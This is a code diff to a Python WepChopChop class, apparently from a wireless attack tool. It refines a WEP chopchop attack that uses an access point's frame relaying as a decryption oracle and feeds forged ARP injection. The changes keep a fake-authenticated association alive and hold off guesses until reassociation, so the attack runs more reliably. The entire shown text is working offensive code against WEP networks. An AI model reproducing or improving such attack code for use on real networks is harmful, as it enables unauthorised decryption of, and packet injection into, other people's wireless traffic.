@@ -92,6 +92,7 @@ class WepChopChop:
         source_mac: bytes,
         on_forged_arp: Callable[[bytes], None],
         can_inject: Optional[Callable[[], bool]] = None,
+        notify_activity: Optional[Callable[[], None]] = None,
         log_callback: Optional[Callable[[str], None]] = None,
         sender_ip: bytes = bytes([192, 168, 1, 123]),
         target_ip: bytes = bytes([192, 168, 1, 1]),
@@ -105,6 +106,10 @@ class WepChopChop:
         self.source_mac = source_mac
         self._on_forged_arp = on_forged_arp
         self._can_inject = can_inject or (lambda: True)
+        # Our guesses ARE activity — feed this so fake-auth's periodic keepalive
+        # re-auth doesn't fire mid-chop (a long byte-walk would otherwise hit
+        # the inactivity timer and re-auth in the middle of guessing).
+        self._notify_activity = notify_activity or (lambda: None)
         self._log = log_callback or (lambda _m: None)
         self._sender_ip = sender_ip
         self._target_ip = target_ip
@@ -238,6 +243,13 @@ class WepChopChop:
     async def _hw_oracle(self, shortened_cipher: bytes) -> bool:
         """Send the chopped frame and watch for the AP relaying it (the pinned
         signature, in _rx_cb). True = relayed = the guess was correct."""
+        # Don't burn guesses while de-associated (a reactive re-auth in flight)
+        # — wait briefly for the association to come back, so we never miss the
+        # correct guess by sending it into the void.
+        waited = 0.0
+        while self._active and not self._can_inject() and waited < 5.0:
+            await asyncio.sleep(0.1)
+            waited += 0.1
         self._relay_seen = False
         try:
             await self.iface.send_raw(self._build_frame(shortened_cipher),
@@ -245,6 +257,7 @@ class WepChopChop:
         except Exception:
             logger.exception("[WEP-Chop] send_raw failed")
             return False
+        self._notify_activity()   # keep the assoc alive — no periodic re-auth
         deadline = time.time() + self._ORACLE_TIMEOUT_S
         while time.time() < deadline:
             if self._relay_seen:
